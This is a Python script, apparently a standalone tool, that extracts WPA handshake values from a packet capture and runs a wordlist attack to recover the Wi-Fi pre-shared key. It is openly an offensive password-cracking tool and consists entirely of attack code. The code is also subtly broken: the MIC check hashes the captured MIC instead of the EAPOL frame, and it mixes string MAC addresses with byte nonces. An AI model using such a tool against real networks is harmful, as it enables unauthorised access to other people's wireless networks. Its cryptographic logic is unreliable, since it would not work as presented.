import sys
import binascii
import hashlib
import hmac
from scapy.all import rdpcap, EAPOL, Dot11Beacon
import argparse

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None
    
    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    return mic, snonce, sta_mac, bssid, anonce, ssid

def pbkdf2_f(hash_name, password, ssid, iterations, dklen):
    dk = hashlib.pbkdf2_hmac(hash_name, password.encode(), ssid.encode(), iterations, dklen)
    return dk

def customPRF512(pmk, a, b):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(pmk, a + chr(0x00).encode() + b + chr(i).encode(), hashlib.sha1)
        R = R + hmacsha1.digest()
        i += 1
    return R[:blen]

def crack_psk(wordlist_file, mic, snonce, sta_mac, bssid, anonce, ssid):
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip()
            pmk = pbkdf2_f('sha1', word, ssid, 4096, 32)
            a = b"Pairwise key expansion"
            b = min(sta_mac, bssid) + max(sta_mac, bssid) + min(anonce, snonce) + max(anonce, snonce)
            ptk = customPRF512(pmk, a, b)
            mic_to_test = hmac.new(ptk[0:16], mic, hashlib.sha1)
            if mic_to_test.digest() == mic:
                print(f"Cracked PSK: {word}")
                return word
    print("Failed to crack PSK.")
    return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Crack WPA PSK using aircrack logic.')
    parser.add_argument('capture_file', type=str, help='Path to the capture file (CAP/PCAP)')
    parser.add_argument('-P', '--wordlist', type=str, required=True, help='Path to the wordlist file')
    args = parser.parse_args()

    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_and_nonce_and_ssid(args.capture_file)
    if mic and snonce and sta_mac and bssid and anonce and ssid:
        crack_psk(args.wordlist, mic, snonce, sta_mac, bssid, anonce, ssid)
    else:
        print("Failed to extract necessary information from capture file.")
